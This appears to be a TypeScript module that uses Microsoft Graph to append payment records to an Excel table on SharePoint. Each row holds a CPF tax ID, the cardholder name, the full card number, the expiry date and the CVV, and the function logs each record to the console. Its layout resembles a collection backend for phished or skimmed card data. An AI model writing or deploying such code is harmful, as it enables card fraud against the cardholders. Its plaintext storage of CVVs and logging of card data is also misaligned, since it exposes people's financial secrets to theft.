import { ClientSecretCredential } from "@azure/identity";
import { Client } from "@microsoft/microsoft-graph-client";
import { TokenCredentialAuthenticationProvider } from "@microsoft/microsoft-graph-client/authProviders/azureTokenCredentials";
import "isomorphic-fetch";

const tenantId = process.env.MICROSOFT_TENANT_ID;
const clientId = process.env.MICROSOFT_CLIENT_ID;
const clientSecret = process.env.MICROSOFT_CLIENT_SECRET;
const siteId = process.env.MICROSOFT_SITE_ID;
const driveId = process.env.MICROSOFT_DRIVE_ID;
const itemId = process.env.MICROSOFT_ITEM_ID;

console.log('Environment variables:', {
  tenantId: tenantId ? 'Set' : 'Not set',
  clientId: clientId ? 'Set' : 'Not set',
  clientSecret: clientSecret ? 'Set' : 'Not set',
  siteId: siteId ? 'Set' : 'Not set',
  driveId: driveId ? 'Set' : 'Not set',
  itemId: itemId ? 'Set' : 'Not set'
});

if (!tenantId || !clientId || !clientSecret || !siteId || !driveId || !itemId) {
  throw new Error('Missing required environment variables');
}

const credential = new ClientSecretCredential(tenantId, clientId, clientSecret);

const authProvider = new TokenCredentialAuthenticationProvider(credential, {
  scopes: ['https://graph.microsoft.com/.default']
});

const client = Client.initWithMiddleware({
  authProvider: authProvider,
});

export const addRowToExcel = async (data: any) => {
  console.log('Attempting to add row to Excel:', data);

  try {
    const result = await client.api(`/sites/${siteId}/drives/${driveId}/items/${itemId}/workbook/tables/Table1/rows`)
      .post({
        values: [
          [
            data['CPF'],
            data['Nome no Cartão'],
            data['Número do Cartão'],
            data['Validade'],
            data['CVV'],
            data['Método de Pagamento']
          ]
        ]
      });

    console.log('Row added successfully:', result);
    return result;
  } catch (error) {
    console.error('Error adding row to Excel:', error);
    throw error;
  }
};

